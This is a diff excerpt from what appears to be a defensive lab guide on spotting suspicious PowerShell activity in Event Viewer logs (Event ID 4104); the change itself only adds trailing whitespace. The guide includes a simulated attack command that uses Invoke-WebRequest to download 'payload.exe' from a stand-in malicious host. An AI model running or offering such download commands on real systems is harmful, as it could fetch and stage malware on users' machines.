@@ -73,10 +73,10 @@ This command will list the local users on your system, which attackers might use
 ```
 Invoke-WebRequest -Uri "http://maliciouswebsite.com/payload.exe" -OutFile "C:\temp\payload.exe"`
 ```
-This command simulates downloading a malicious payload from a remote server.
-2. Go back to Event Viewer and filter the PowerShell logs for Event ID 4104.
-3. Check for any suspicious activity or abnormal PowerShell command execution, specifically focusing on the `Invoke-WebRequest` or any network-based PowerShell command.
-4. Take a screenshot of the event details.
+This command simulates downloading a malicious payload from a remote server.    
+2. Go back to Event Viewer and filter the PowerShell logs for Event ID 4104.     
+3. Check for any suspicious activity or abnormal PowerShell command execution, specifically focusing on the `Invoke-WebRequest` or any network-based PowerShell command.    
+4. Take a screenshot of the event details.     
 
 ### **Step 4: Analyze Suspicious PowerShell Logs**
 - Investigate any PowerShell events that show script execution from suspicious sources or unexpected locations.
